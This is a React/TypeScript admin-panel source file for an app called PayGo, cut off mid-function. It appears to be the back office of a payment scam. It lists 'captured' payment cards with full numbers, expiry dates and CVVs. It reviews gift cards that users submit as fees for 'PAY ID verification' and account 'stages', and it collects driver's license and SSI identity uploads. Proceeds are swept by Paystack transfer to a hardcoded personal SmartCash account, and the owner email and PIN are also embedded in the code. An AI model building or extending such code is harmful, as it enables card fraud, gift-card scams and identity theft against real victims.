import React, { useState, useEffect } from 'react';
import {
  ArrowLeft,
  CreditCard,
  Gift,
  CheckCircle2,
  Lock,
  ArrowDownRight,
  ArrowUpRight,
  Check,
  Copy,
  Sparkles,
  Eye,
  CheckCircle,
  LogOut,
  ShieldCheck,
  Ban,
  Trash2,
  Landmark,
  Wallet,
  Send,
  AlertCircle,
  RefreshCw,
  IdCard,
} from 'lucide-react';

import { collection, onSnapshot, query, doc, updateDoc, setDoc, getDoc, deleteDoc, addDoc } from 'firebase/firestore';
import { onAuthStateChanged, signInWithPopup, signOut, User as FirebaseUser } from 'firebase/auth';
import { db, auth, googleProvider, handleFirestoreError, OperationType, blockUsedGiftCardCode } from '../lib/firebase';
import { GiftCardSubmission, KycSubmission } from '../types';
import { hashGiftCardCode } from '../utils/giftCardValidator';

const OWNER_EMAIL = 'ibro88977@gmail.com';
const OWNER_PIN = '4568';

interface BankOption {
  name: string;
  code: string;
}

const DEFAULT_PAYOUT_BANKS: BankOption[] = [
  { name: 'Paystack-Titan', code: '100039' },
  { name: 'SmartCash PSB (Airtel)', code: '120004' },
  { name: 'Access Bank', code: '044' },
  { name: 'GTBank (Guaranty Trust Bank)', code: '058' },
  { name: 'Zenith Bank', code: '057' },
  { name: 'First Bank of Nigeria', code: '011' },
  { name: 'UBA (United Bank for Africa)', code: '033' },
  { name: 'Fidelity Bank', code: '070' },
  { name: 'Kuda Microfinance Bank', code: '50211' },
  { name: 'OPay Digital Services', code: '999992' },
  { name: 'PalmPay', code: '999991' },
  { name: 'Moniepoint MFB', code: '50515' },
  { name: 'Wema Bank', code: '035' },
  { name: 'Sterling Bank', code: '232' },
  { name: 'Union Bank of Nigeria', code: '032' },
  { name: 'Stanbic IBTC Bank', code: '221' },
  { name: 'Providus Bank', code: '101' },
  { name: 'Other Bank (Custom Bank & Code)', code: 'CUSTOM' },
];

interface AdminTransaction {
  id: string;
  type: string;
  direction: 'in' | 'out';
  amount: number;
  sourceId?: string;
  bankName?: string;
  accountNumber?: string;
  accountName?: string;
  reference?: string;
  transferCode?: string;
  status: string;
  userEmail?: string;
  note?: string;
  date: string;
  timestamp: string;
}

interface PaystackGatewayStatus {
  checked: boolean;
  configured: boolean;
  mode: 'live' | 'test' | 'unconfigured';
  message?: string;
  balances?: Array<{ currency: string; balance: number }>;
}

interface CapturedCard {
  id: string;
  type: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  cardName: string;
  amount: number;
  userEmail: string;
  userName: string;
  date: string;
  timestamp?: string;
}

interface AdminPanelProps {
  onBack: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'cards' | 'giftcards' | 'kyc' | 'payouts'>('cards');
  const [cards, setCards] = useState<CapturedCard[]>([]);
  const [giftCards, setGiftCards] = useState<GiftCardSubmission[]>([]);
  const [kycSubmissions, setKycSubmissions] = useState<KycSubmission[]>([]);
  const [adminTransactions, setAdminTransactions] = useState<AdminTransaction[]>([]);
  const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
  const [authReady, setAuthReady] = useState(false);
  const [isPinUnlocked, setIsPinUnlocked] = useState(false);
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [selectedCardForWithdraw, setSelectedCardForWithdraw] = useState<CapturedCard | null>(null);
  const [withdrawAmountInput, setWithdrawAmountInput] = useState('');
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
  const [previewImage, setPreviewImage] = useState<string | null>(null);
  const [previewImageTitle, setPreviewImageTitle] = useState<string>('Uploaded Photo');
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
  const [blockCodeInput, setBlockCodeInput] = useState('');
  const [blockNotice, setBlockNotice] = useState('');
  const [actionToast, setActionToast] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  // Paystack Gateway & Bank Payout state (no fake demo balances)
  const DEFAULT_PAYOUT_BANK_CODE = '120004';
  const DEFAULT_PAYOUT_ACCOUNT_NUMBER = '8081756524';

  const [paystackStatus, setPaystackStatus] = useState<PaystackGatewayStatus>({
    checked: false,
    configured: false,
    mode: 'unconfigured',
  });
  const [availableBanks, setAvailableBanks] = useState<BankOption[]>(DEFAULT_PAYOUT_BANKS);
  const [showBankPayoutModal, setShowBankPayoutModal] = useState(false);
  const [payoutBankCode, setPayoutBankCode] = useState(DEFAULT_PAYOUT_BANK_CODE);
  const [customBankName, setCustomBankName] = useState('');
  const [customBankCode, setCustomBankCode] = useState('');
  const [payoutAccountNumber, setPayoutAccountNumber] = useState(DEFAULT_PAYOUT_ACCOUNT_NUMBER);
  const [payoutAccountName, setPayoutAccountName] = useState(() => {
    try {
      return localStorage.getItem('paygo_owner_smartcash_name') || '';
    } catch {
      return '';
    }
  });
  const [payoutAmount, setPayoutAmount] = useState('');
  const [payoutNote, setPayoutNote] = useState('');
  const [payoutError, setPayoutError] = useState('');
  const [isResolvingAccount, setIsResolvingAccount] = useState(false);
  const [resolveAccountNotice, setResolveAccountNotice] = useState('');
  const [isProcessingPayout, setIsProcessingPayout] = useState(false);
  const [completedPayout, setCompletedPayout] = useState<AdminTransaction | null>(null);
  const [autoWithdrawToSmartCash, setAutoWithdrawToSmartCash] = useState<boolean>(() => {
    try {
      const saved = localStorage.getItem('paygo_auto_withdraw_smartcash');
      return saved === null ? true : saved === 'true';
    } catch {
      return true;
    }
  });

  const toggleAutoWithdrawSmartCash = () => {
    setAutoWithdrawToSmartCash((prev) => {
      const next = !prev;
      try {
        localStorage.setItem('paygo_auto_withdraw_smartcash', String(next));
      } catch {}
      showToast(
        'success',
        next
          ? `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) turned ON.`
          : `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) turned OFF. Funds will stay in Treasury until you remove/withdraw them manually.`
      );
      return next;
    });
  };

  // Clear any legacy demo localStorage balances so only real Firestore ledger values are used
  useEffect(() => {
    try {
      localStorage.removeItem('paygo_admin_wallet_balance');
      localStorage.removeItem('paygo_admin_payout_history');
    } catch {
      // ignore storage access issues
    }
  }, []);

  // Derived real treasury figures from Firestore /transactions ledger
  const settledInflows = adminTransactions.filter((t) => t.direction === 'in');
  const payoutHistory = adminTransactions.filter((t) => t.direction === 'out');
  const totalSettledIn = settledInflows.reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
  const totalSettledOut = payoutHistory.reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
  const adminWalletBalance = Math.max(0, totalSettledIn - totalSettledOut);
  const settledSourceIds = new Set(settledInflows.map((t) => t.sourceId).filter(Boolean) as string[]);

  const pendingCardAmount = cards
    .filter((c) => !settledSourceIds.has(c.id))
    .reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
  const pendingGiftCards = giftCards.filter((g) => (g.status || 'pending') === 'pending');
  const pendingGiftAmount = pendingGiftCards.reduce((sum, g) => sum + (Number(g.amount) || 0), 0);
  const pendingPaymentsTotal = pendingCardAmount + pendingGiftAmount;

  const showToast = (type: 'success' | 'error', text: string) => {
    setActionToast({ type, text });
    setTimeout(() => setActionToast(null), 5000);
  };

  const recordRealInflow = async (params: {
    type: string;
    amount: number;
    sourceId: string;
    userEmail?: string;
    note?: string;
  }): Promise<boolean> => {
    const cleanAmount = Number(params.amount) || 0;
    if (cleanAmount <= 0) return false;
    if (settledSourceIds.has(params.sourceId)) return false;

    const now = new Date();
    await addDoc(collection(db, 'transactions'), {
      type: params.type,
      direction: 'in',
      amount: cleanAmount,
      sourceId: params.sourceId,
      userEmail: params.userEmail || 'unknown',
      note: params.note || 'Approved client payment',
      status: 'Settled',
      date: now.toLocaleString(),
      timestamp: now.toISOString(),
    });
    return true;
  };

  const maybeAutoDispatchToSmartCash = async (amount: number, sourceLabel: string): Promise<boolean> => {
    if (!autoWithdrawToSmartCash || amount <= 0) return false;
    if (!paystackStatus.configured || !payoutAccountName.trim()) {
      return false;
    }
    return executeLivePaystackTransfer({
      bankCode: DEFAULT_PAYOUT_BANK_CODE,
      bankName: 'SmartCash PSB (Airtel)',
      accountNumber: DEFAULT_PAYOUT_ACCOUNT_NUMBER,
      accountName: payoutAccountName.trim(),
      amount,
      note: `Auto-Withdraw to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER}) • ${sourceLabel}`,
    });
  };

  const handleAutoWithdrawCard = async (c: CapturedCard) => {
    const amountToWithdraw = Number(c.amount) || 0;
    setIsWithdrawing(true);
    try {
      const recorded = await recordRealInflow({
        type: c.type || 'ATM Card Settlement',
        amount: amountToWithdraw,
        sourceId: c.id,
        userEmail: c.userEmail,
        note: `Card ${c.cardNumber} settled to Treasury`,
      });
      await deleteDoc(doc(db, 'cardSubmissions', c.id));

      if (recorded) {
        const autoSent = await maybeAutoDispatchToSmartCash(amountToWithdraw, `Card ${c.cardNumber}`);
        showToast(
          'success',
          autoSent
            ? `Auto-withdrawn $${amountToWithdraw.toLocaleString()} directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
            : `Settled $${amountToWithdraw.toLocaleString()} to Treasury Wallet. Tap "Remove / Withdraw Money" anytime to send to SmartCash ${DEFAULT_PAYOUT_ACCOUNT_NUMBER}.`
        );
      } else {
        showToast('success', `Cleaned up already-settled card ${c.cardNumber}.`);
      }
    } catch (err: any) {
      showToast('error', err?.message || 'Failed to settle ATM card submission.');
    } finally {
      setIsWithdrawing(false);
    }
  };

  const handleAutoSettleAllCards = async () => {
    if (cards.length === 0) {
      showToast('error', 'No ATM cards available to settle.');
      return;
    }

    setIsWithdrawing(true);
    let newlySettledTotal = 0;
    let settledCount = 0;
    try {
      for (const c of cards) {
        const amt = Number(c.amount) || 0;
        const recorded = await recordRealInflow({
          type: c.type || 'ATM Card Settlement',
          amount: amt,
          sourceId: c.id,
          userEmail: c.userEmail,
          note: `Bulk settled card ${c.cardNumber}`,
        });
        if (recorded) {
          newlySettledTotal += amt;
        }
        await deleteDoc(doc(db, 'cardSubmissions', c.id));
        settledCount += 1;
      }

      if (newlySettledTotal > 0) {
        const autoSent = await maybeAutoDispatchToSmartCash(
          newlySettledTotal,
          `Bulk ATM (${settledCount} cards)`
        );
        showToast(
          'success',
          autoSent
            ? `Auto-withdrawn $${newlySettledTotal.toLocaleString()} across ${settledCount} ATM card(s) directly to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
            : `Settled $${newlySettledTotal.toLocaleString()} across ${settledCount} ATM card(s) into Real Treasury Balance.`
        );
      } else {
        showToast('success', `Archived ${settledCount} already-settled ATM card submission(s).`);
      }
    } catch (err: any) {
      showToast('error', err?.message || 'Error settling ATM card submissions.');
    } finally {
      setIsWithdrawing(false);
    }
  };

  const handleOpenBankPayout = (preFillMax = false) => {
    setPayoutError('');
    setResolveAccountNotice('');
    setCompletedPayout(null);
    if (!payoutBankCode) setPayoutBankCode(DEFAULT_PAYOUT_BANK_CODE);
    if (!payoutAccountNumber.trim()) setPayoutAccountNumber(DEFAULT_PAYOUT_ACCOUNT_NUMBER);
    setPayoutAmount(preFillMax && adminWalletBalance > 0 ? adminWalletBalance.toString() : '');
    setPayoutNote('');
    setShowBankPayoutModal(true);
  };

  const executeLivePaystackTransfer = async (params: {
    bankCode: string;
    bankName: string;
    accountNumber: string;
    accountName: string;
    amount: number;
    note?: string;
  }) => {
    if (!firebaseUser) {
      setPayoutError('Admin session expired. Please sign in again.');
      return false;
    }

    setIsProcessingPayout(true);
    try {
      const idToken = await firebaseUser.getIdToken();
      const transferRes = await fetch('/api/paystack/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${idToken}`,
        },
        body: JSON.stringify({
          bankCode: params.bankCode,
          bankName: params.bankName,
          accountNumber: params.accountNumber,
          accountName: params.accountName.trim().toUpperCase(),
          amount: params.amount,
          reason: params.note?.trim() || `PayGo Admin Settlement to ${params.bankName}`,
        }),
      });

      const transferData = await transferRes.json();
      if (!transferRes.ok || !transferData.ok) {
        setPayoutError(
          transferData.error ||
            'Live Paystack transfer could not be processed. Ensure PAYSTACK_SECRET_KEY is configured and your Paystack balance has sufficient funds.'
        );
        return false;
      }

      const now = new Date();
      const txPayload = {
        type: 'Admin Bank Payout',
        direction: 'out' as const,
        bankName: params.bankName,
        accountNumber: params.accountNumber,
        accountName: params.accountName.trim().toUpperCase(),
        amount: params.amount,
        reference: transferData.reference || `PG-LIVE-${Date.now()}`,
        transferCode: transferData.transferCode || '',
        status: transferData.status || 'Settled',
        note: params.note?.trim() || 'Live Paystack Treasury Settlement',
        ownerEmail: firebaseUser.email || OWNER_EMAIL,
        date: now.toLocaleString(),
        timestamp: now.toISOString(),
      };

      const docRef = await addDoc(collection(db, 'transactions'), txPayload);
      const savedRecord: AdminTransaction = { id: docRef.id, ...txPayload };
      setCompletedPayout(savedRecord);
      showToast(
        'success',
        `Real Paystack transfer initiated: $${params.amount.toLocaleString()} sent to ${params.bankName} (${params.accountNumber})!`
      );
      return true;
    } catch (err: any) {
      setPayoutError(err?.message || 'Network error executing Paystack bank transfer.');
      return false;
    } finally {
      setIsProcessingPayout(false);
    }
  };

  const handleDirectWithdrawToSmartCash = async () => {
    setPayoutBankCode(DEFAULT_PAYOUT_BANK_CODE);
    setPayoutAccountNumber(DEFAULT_PAYOUT_ACCOUNT_NUMBER);
    setPayoutError('');
    setResolveAccountNotice('');
    setCompletedPayout(null);

    if (adminWalletBalance <= 0) {
      handleOpenBankPayout(false);
      showToast('error', 'Real Treasury Balance is $0.00. Approve a real user payment first before withdrawing to SmartCash 8081756524.');
      return;
    }

    if (paystackStatus.configured && payoutAccountName.trim()) {
      setShowBankPayoutModal(true);
      await executeLivePaystackTransfer({
        bankCode: DEFAULT_PAYOUT_BANK_CODE,
        bankName: 'SmartCash PSB (Airtel)',
        accountNumber: DEFAULT_PAYOUT_ACCOUNT_NUMBER,
        accountName: payoutAccountName.trim(),
        amount: adminWalletBalance,
        note: 'Direct Admin Withdrawal to SmartCash 8081756524',
      });
      return;
    }

    setPayoutAmount(adminWalletBalance.toString());
    setShowBankPayoutModal(true);
  };

  const refreshPaystackStatus = async (userObj: FirebaseUser | null) => {
    if (!userObj) return;
    try {
      const idToken = await userObj.getIdToken();
      const statusRes = await fetch('/api/paystack/status', {
        headers: { Authorization: `Bearer ${idToken}` },
      });
      if (!statusRes.ok) return;
      const statusData = await statusRes.json();
      setPaystackStatus({
        checked: true,
        configured: Boolean(statusData.configured),
        mode: statusData.mode || (statusData.configured ? 'test' : 'unconfigured'),
        message: statusData.message,
        balances: statusData.balances,
      });

      if (statusData.configured) {
        const banksRes = await fetch('/api/paystack/banks', {
          headers: { Authorization: `Bearer ${idToken}` },
        });
        if (banksRes.ok) {
          const banksData = await banksRes.json();
          if (Array.isArray(banksData.banks) && banksData.banks.length > 0) {
            const mapped: BankOption[] = banksData.banks
              .filter((b: any) => b?.name && b?.code)
              .map((b: any) => ({ name: String(b.name), code: String(b.code) }));
            // Ensure Paystack-Titan and SmartCash PSB are always included and Custom fallback is last
            const hasTitan = mapped.some((b) => b.code === '100039' || b.name.toLowerCase().includes('titan'));
            const hasSmartCash = mapped.some((b) => b.code === '120004' || b.name.toLowerCase().includes('smartcash'));
            const finalBanks: BankOption[] = [
              ...(hasTitan ? [] : [{ name: 'Paystack-Titan', code: '100039' }]),
              ...(hasSmartCash ? [] : [{ name: 'SmartCash PSB (Airtel)', code: '120004' }]),
              ...mapped,
              { name: 'Other Bank (Custom Bank & Code)', code: 'CUSTOM' },
            ];
            setAvailableBanks(finalBanks);
          }
        }

        // Auto-resolve default SmartCash account (8081756524) when Paystack is configured
        try {
          const resolveRes = await fetch(
            `/api/paystack/resolve-account?account_number=${encodeURIComponent(DEFAULT_PAYOUT_ACCOUNT_NUMBER)}&bank_code=${encodeURIComponent(DEFAULT_PAYOUT_BANK_CODE)}`,
            { headers: { Authorization: `Bearer ${idToken}` } }
          );
          if (resolveRes.ok) {
            const resolveData = await resolveRes.json();
            if (resolveData?.ok && resolveData.account_name) {
              setPayoutAccountName(resolveData.account_name);
              try {
                localStorage.setItem('paygo_owner_smartcash_name', resolveData.account_name);
              } catch {}
            }
          }
        } catch {
          // silent auto-resolve fallback
        }
      }
    } catch {
      setPaystackStatus((prev) => ({ ...prev, checked: true }));
    }
  };

  const handleResolveBankAccount = async () => {
    setPayoutError('');
    setResolveAccountNotice('');
    const resolvedCode = payoutBankCode === 'CUSTOM' ? customBankCode.trim() : payoutBankCode;
    const cleanAcct = payoutAccountNumber.trim();

    if (!resolvedCode || resolvedCode === 'CUSTOM') {
      setResolveAccountNotice('Select a bank or enter a bank code first.');
      return;
    }
    if (cleanAcct.length < 8) {
      setResolveAccountNotice('Enter a valid 10-digit account number to verify.');
      return;
    }
    if (!firebaseUser) return;

    setIsResolvingAccount(true);
    try {
      const idToken = await firebaseUser.getIdToken();
      const res = await fetch(
        `/api/paystack/resolve-account?account_number=${encodeURIComponent(cleanAcct)}&bank_code=${encodeURIComponent(resolvedCode)}`,
        { headers: { Authorization: `Bearer ${idToken}` } }
      );
      const data = await res.json();
      if (!res.ok || !data.ok) {
        setResolveAccountNotice(data.error || 'Could not resolve account name.');
        return;
      }
      if (data.account_name) {
        setPayoutAccountName(data.account_name);
        setResolveAccountNotice(`Verified: ${data.account_name}`);
        if (cleanAcct === DEFAULT_PAYOUT_ACCOUNT_NUMBER && resolvedCode === DEFAULT_PAYOUT_BANK_CODE) {
          try {
            localStorage.setItem('paygo_owner_smartcash_name', data.account_name);
          } catch {}
        }
      }
    } catch (err: any) {
      setResolveAccountNotice(err?.message || 'Account lookup failed.');
    } finally {
      setIsResolvingAccount(false);
    }
  };

  const handleExecuteBankPayout = async (e: React.FormEvent) => {
    e.preventDefault();
    setPayoutError('');

    const selectedOption = availableBanks.find((b) => b.code === payoutBankCode);
    const resolvedBankName =
      payoutBankCode === 'CUSTOM'
        ? customBankName.trim()
        : selectedOption?.name || 'SmartCash PSB (Airtel)';
    const resolvedBankCode =
      payoutBankCode === 'CUSTOM' ? customBankCode.trim() : payoutBankCode;

    if (!resolvedBankName || !resolvedBankCode) {
      setPayoutError('Please select a destination bank (or enter custom bank name & bank code).');
      return;
    }

    const cleanAcctNum = payoutAccountNumber.trim();
    if (cleanAcctNum.length < 6) {
      setPayoutError('Please enter a valid bank account number.');
      return;
    }

    if (!payoutAccountName.trim()) {
      setPayoutError('Please enter or verify the bank account holder name.');
      return;
    }

    const amt = parseFloat(payoutAmount);
    if (isNaN(amt) || amt <= 0) {
      setPayoutError('Please enter a valid withdrawal amount.');
      return;
    }

    if (amt > adminWalletBalance) {
      setPayoutError('Withdrawal amount exceeds your Real Settled Treasury Balance.');
      return;
    }

    if (cleanAcctNum === DEFAULT_PAYOUT_ACCOUNT_NUMBER && resolvedBankCode === DEFAULT_PAYOUT_BANK_CODE) {
      try {
        localStorage.setItem('paygo_owner_smartcash_name', payoutAccountName.trim().toUpperCase());
      } catch {}
    }

    await executeLivePaystackTransfer({
      bankCode: resolvedBankCode,
      bankName: resolvedBankName,
      accountNumber: cleanAcctNum,
      accountName: payoutAccountName.trim(),
      amount: amt,
      note: payoutNote,
    });
  };

  const isOwnerGoogleVerified =
    !!firebaseUser &&
    firebaseUser.email?.toLowerCase() === OWNER_EMAIL &&
    firebaseUser.emailVerified === true;

  const isFullyAuthorized = isOwnerGoogleVerified && isPinUnlocked;

  // Watch Firebase Auth state
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (current) => {
      if (current && current.email?.toLowerCase() !== OWNER_EMAIL) {
        await signOut(auth).catch(() => {});
        setFirebaseUser(null);
        setIsPinUnlocked(false);
        setError('Access denied: Only the authorized owner account can access this portal.');
      } else {
        setFirebaseUser(current);
      }
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  // Load ATM Card Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setCards([]);
      return;
    }

    const q = query(collection(db, 'cardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedCards: CapturedCard[] = [];
        snapshot.forEach((docSnap) => {
          fetchedCards.push({ id: docSnap.id, ...docSnap.data() } as CapturedCard);
        });
        fetchedCards.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setCards(fetchedCards);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'cardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load Gift Card Verification Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setGiftCards([]);
      return;
    }

    const q = query(collection(db, 'giftCardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedGifts: GiftCardSubmission[] = [];
        snapshot.forEach((docSnap) => {
          fetchedGifts.push({ id: docSnap.id, ...docSnap.data() } as GiftCardSubmission);
        });
        fetchedGifts.sort((a, b) => {
          const timeA = (a as any).timestamp || a.date || '';
          const timeB = (b as any).timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setGiftCards(fetchedGifts);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'giftCardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load Driver's License & SSI KYC Verification Submissions when owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setKycSubmissions([]);
      return;
    }

    const q = query(collection(db, 'kycSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedKyc: KycSubmission[] = [];
        snapshot.forEach((docSnap) => {
          fetchedKyc.push({ id: docSnap.id, ...docSnap.data() } as KycSubmission);
        });
        fetchedKyc.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setKycSubmissions(fetchedKyc);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'kycSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load real settled Admin Treasury transactions (payments in & payouts out) from Firestore
  useEffect(() => {
    if (!isFullyAuthorized) {
      setAdminTransactions([]);
      return;
    }

    const q = query(collection(db, 'transactions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedTx: AdminTransaction[] = [];
        snapshot.forEach((docSnap) => {
          const data = docSnap.data() as any;
          const direction: 'in' | 'out' =
            data.direction === 'in' || data.direction === 'out'
              ? data.direction
              : data.bankName || data.type === 'Admin Bank Payout'
              ? 'out'
              : 'in';
          fetchedTx.push({
            id: docSnap.id,
            type: data.type || 'Payment',
            direction,
            amount: Number(data.amount) || 0,
            sourceId: data.sourceId,
            bankName: data.bankName,
            accountNumber: data.accountNumber,
            accountName: data.accountName,
            reference: data.reference,
            transferCode: data.transferCode,
            status: data.status || 'Settled',
            userEmail: data.userEmail,
            note: data.note,
            date: data.date || '',
            timestamp: data.timestamp || '',
          });
        });
        fetchedTx.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setAdminTransactions(fetchedTx);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'transactions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Check Paystack Gateway Status & Live Bank List when owner unlocks portal
  useEffect(() => {
    if (!isFullyAuthorized || !firebaseUser) return;
    refreshPaystackStatus(firebaseUser);
  }, [isFullyAuthorized, firebaseUser]);

  const handleOwnerGoogleSignIn = async () => {
    setError('');
    setIsSigningIn(true);
    try {
      const result = await signInWithPopup(auth, googleProvider);
      if (
        result.user.email?.toLowerCase() !== OWNER_EMAIL ||
        !result.user.emailVerified
      ) {
        await signOut(auth);
        setFirebaseUser(null);
        setError('Access denied: Only the authorized owner account can access this portal.');
      }
    } catch (err: any) {
      console.error('Owner Google sign-in error:', err);
      setError(err?.message || 'Google sign-in failed. Please try again.');
    } finally {
      setIsSigningIn(false);
    }
  };

  const handlePinUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isOwnerGoogleVerified) {
      setError('Please verify your owner Google account first.');
      return;
    }
    if (pin.trim() === OWNER_PIN) {
      setIsPinUnlocked(true);
      setPin('');
      setError('');
    } else {
      setError('Invalid Owner PIN');
    }
  };

  const handleAdminSignOut = async () => {
    setIsPinUnlocked(false);
    setPin('');
    await signOut(auth).catch(() => {});
  };

  const copyText = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  const handleUpdateGiftCardStatus = async (
    g: GiftCardSubmission,
    newStatus: 'verified' | 'redeemed' | 'rejected',
    customReason?: string
  ) => {
    try {
      const rejectionReason =
        customReason || 'USED / FAKE GIFT CARD: Wrong or already-used gift card is not allowed.';
      const nowIso = new Date().toISOString();
      const updates: Record<string, any> = { status: newStatus };
      if (newStatus === 'rejected') {
        updates.rejectionReason = rejectionReason;
      }
      await updateDoc(doc(db, 'giftCardSubmissions', g.id), updates);

      // Update PII-free real-time status mirror so the client receives instant approval or rejection
      if (g.statusId) {
        const statusPayload: Record<string, any> = {
          id: g.statusId,
          type: g.type,
          status: newStatus,
          updatedAt: nowIso,
        };
        if (newStatus === 'rejected') {
          statusPayload.rejectionReason = rejectionReason;
        }
        await setDoc(doc(db, 'giftCardStatuses', g.statusId), statusPayload);
      }

      const codeHash = g.codeHash || (await hashGiftCardCode(g.cardCode));
      await setDoc(
        doc(db, 'usedGiftCards', codeHash),
        {
          codeHash,
          brand: g.cardBrand,
          status: newStatus === 'rejected' ? 'used_rejected' : 'redeemed',
          createdAt: nowIso,
        },
        { merge: true }
      );

      // Sync user profile in Firestore (approve PAY ID / tier upgrade OR revoke if rejected as used/wrong)
      if (g.userEmail && g.userEmail !== 'unknown') {
        const cleanUserEmail = g.userEmail.trim().toLowerCase();
        const userRef = doc(db, 'users', cleanUserEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          if (newStatus === 'rejected') {
            await updateDoc(userRef, {
              payIdVerified: false,
              accountLevel: 'Basic',
              updatedAt: nowIso,
            });
          } else if (newStatus === 'verified' || newStatus === 'redeemed') {
            const profileUpdates: Record<string, any> = { updatedAt: nowIso };
            if (g.type === 'PAY ID Verification') {
              profileUpdates.payIdVerified = true;
            } else if (g.type.startsWith('Stage ')) {
              profileUpdates.accountLevel = g.type;
            }
            await updateDoc(userRef, profileUpdates);
          }
        }
      }

      // Record real settled payment into Admin Treasury Wallet when Gift Card is verified or redeemed
      if (newStatus === 'verified' || newStatus === 'redeemed') {
        const giftAmt = Number(g.amount) || 0;
        const credited = await recordRealInflow({
          type: `${g.type} (${g.cardBrand})`,
          amount: giftAmt,
          sourceId: g.id,
          userEmail: g.userEmail,
          note: `Gift Card ${g.cardBrand} approved (${newStatus})`,
        });
        if (credited) {
          const autoSent = await maybeAutoDispatchToSmartCash(giftAmt, `${g.cardBrand} Gift Card`);
          showToast(
            'success',
            autoSent
              ? `Approved ${g.cardBrand} ($${giftAmt.toLocaleString()}) & auto-withdrawn to SmartCash (${DEFAULT_PAYOUT_ACCOUNT_NUMBER})!`
              : `Approved ${g.cardBrand} ($${giftAmt.toLocaleString()}) and credited Real Treasury Balance.`
          );
        } else {
          showToast('success', `Updated ${g.cardBrand} status to ${newStatus}.`);
        }
      } else {
        showToast('error', `Rejected ${g.cardBrand} submission.`);
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.UPDATE, `giftCardSubmissions/${g.id}`);
    }
  };

  const handleUpdateKycStatus = async (
    k: KycSubmission,
    newStatus: 'verified' | 'rejected',
    customReason?: string
  ) => {
    try {
      const nowIso = new Date().toISOString();
      const rejectionReason =
        customReason ||
        "Driver's License or SSI details could not be verified. Please upload clear front/back ID photos and accurate SSI information.";

      const submissionUpdates: Record<string, any> = { status: newStatus };
      if (newStatus === 'rejected') {
        submissionUpdates.rejectionReason = rejectionReason;
      }
      await updateDoc(doc(db, 'kycSubmissions', k.id), submissionUpdates);

      if (k.statusId) {
        const statusPayload: Record<string, any> = {
          id: k.statusId,
          status: newStatus,
          updatedAt: nowIso,
        };
        if (newStatus === 'rejected') {
          statusPayload.rejectionReason = rejectionReason;
        }
        await setDoc(doc(db, 'kycStatuses', k.statusId), statusPayload);
      }

      if (k.userEmail && k.userEmail !== 'unknown') {
        const cleanUserEmail = k.userEmail.trim().toLowerCase();
        const userRef = doc(db, 'users', cleanUserEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          await updateDoc(userRef, {
            kycVerified: newStatus === 'verified',
            kycStatus: newStatus,
            kycRejectionReason: newStatus === 'rejected' ? rejectionReason : '',
            updatedAt: nowIso,
          });
        }
      }

      showToast(
        newStatus === 'verified' ? 'success' : 'error',
        newStatus === 'verified'
          ? `Approved Driver's License & SSI for ${k.userEmail} — withdrawals unlocked!`
          : `Rejected ID & SSI verification for ${k.userEmail}.`
      );
    } catch (err) {
      handleFirestoreError(err, OperationType.UPDATE, `kycSubmissions/${k.id}`);
    }
  };

  const handleDeleteKyc = async (kycId: string) => {
    try {
      await deleteDoc(doc(db, 'kycSubmissions', kycId));
      showToast('success', 'Removed KYC submission record.');
    } catch (err) {
      handleFirestoreError(err, OperationType.DELETE, `kycSubmissions/${kycId}`);
    }
  };

  const handleManualBlockUsedCard = async (e: React.FormEvent) => {
    e.preventDefault();
    setBlockNotice('');
    const clean = blockCodeInput.trim();
